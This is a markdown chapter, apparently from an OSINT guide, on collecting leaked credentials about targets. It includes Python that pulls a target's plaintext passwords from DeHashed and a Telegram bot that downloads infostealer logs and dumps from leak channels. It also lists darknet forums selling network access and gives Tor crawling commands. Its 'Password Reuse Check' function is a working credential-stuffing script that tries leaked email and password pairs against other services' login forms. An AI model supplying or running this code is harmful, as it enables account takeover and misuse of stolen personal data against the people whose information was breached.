# Phase 4 — Data Breaches and the Darknet

> **[← Back to README](../README.md)**

> ⚠️ **Strict OPSEC required. Work from VM only. Open all downloaded files in sandbox.**

In 2026, data leaks continuously and the breach market is highly automated. This is your primary source of fresh creds.

---

## 1. Breach Aggregators (First Tier)

### HaveIBeenPwned (HIBP)
Start with free HIBP or Mozilla Monitor to establish the fact of account compromise.

```python
import requests, hashlib

# Check email in breaches
def check_email(email):
    url = f'https://haveibeenpwned.com/api/v3/breachedaccount/{email}'
    headers = {'hibp-api-key': 'YOUR_KEY', 'User-Agent': 'OSINT-Tool'}
    r = requests.get(url, headers=headers)
    return r.json() if r.status_code == 200 else []

# Check password via k-anonymity (no full hash sent to server)
def check_password(password):
    sha1 = hashlib.sha1(password.encode()).hexdigest().upper()
    prefix, suffix = sha1[:5], sha1[5:]
    r = requests.get(f'https://api.pwnedpasswords.com/range/{prefix}')
    return suffix in r.text
```

### DeHashed
HIBP doesn't show passwords. DeHashed provides plaintext or hashes. Supports queries by IP, VIN, domains, addresses.

```python
import requests, base64

creds = base64.b64encode(b'user@email.com:API_KEY').decode()
headers = {'Authorization': f'Basic {creds}', 'Accept': 'application/json'}

r = requests.get('https://api.dehashed.com/search?query=email:target@gmail.com&size=100',
                 headers=headers)
for entry in r.json().get('entries', []):
    print(entry.get('email'), entry.get('password'), entry.get('ip_address'))
```

**Rule:** Cross-check target across 2-3 databases. Absence of data in one does not guarantee security.

---

## 2. Telegram Channels (Real-Time Leaks)

Infostealer logs and dumps appear here earlier than in paid databases.

**Search keywords:** `leaks`, `combo`, `logs`, `сливы`, `пробив`

```python
from telethon.sync import TelegramClient
from telethon import events

client = TelegramClient('monitor', API_ID, API_HASH)
LEAK_CHANNELS = ['@channel1', '@channel2']

@client.on(events.NewMessage(chats=LEAK_CHANNELS))
async def handler(event):
    msg = event.message.message
    if any(kw in msg.lower() for kw in ['leak', 'combo', 'logs', 'dump']):
        print(f'[!] New leak post: {msg[:200]}')
        if event.message.document:
            await event.message.download_media('./leaks/')

client.start()
client.run_until_disconnected()
```

**Strict OPSEC:** No personal accounts. Work through VM in read-only mode. Open downloaded databases strictly in sandbox — they are full of malware.

---

## 3. Shadow Forums (Wholesale Database)

Where access to corporate networks is traded (Initial Access Brokers).

| Forum | Specialty | Access |
|-------|-----------|--------|
| **XSS** | RU elite — RDP/VPN accesses sold before ransomware attacks | xss.is via Tor |
| **Exploit** | Zero-days, malware discussions | exploit.in |
| **BreachForums** | EN — massive DB dumps | Via Tor |
| **Dread** | EN — darknet marketplace | Via Tor |

### Automation — TorBot + Darkdump

```bash
git clone https://github.com/DedSecInside/TorBot
cd TorBot && pip install -r requirements.txt

# Ensure Tor is running
systemctl start tor

# Crawl onion site
python torbot.py -u http://example.onion --depth 2 --info

# Darkdump — keyword search via Ahmia
git clone https://github.com/josh0xA/darkdump
python darkdump.py --search "initial access" --count 20
```

### Password Reuse Check

```python
import requests

def check_reuse(email, password, services):
    for service in services:
        try:
            r = requests.post(service['url'],
                data={service['email_field']: email, service['pass_field']: password},
                timeout=5, allow_redirects=False)
            if r.status_code == 302:
                print(f'[+] REUSE CONFIRMED: {service["name"]}')
        except:
            pass
```

---

> **Script:** [`breach_checker.py`](../scripts/phase4/breach_checker.py)
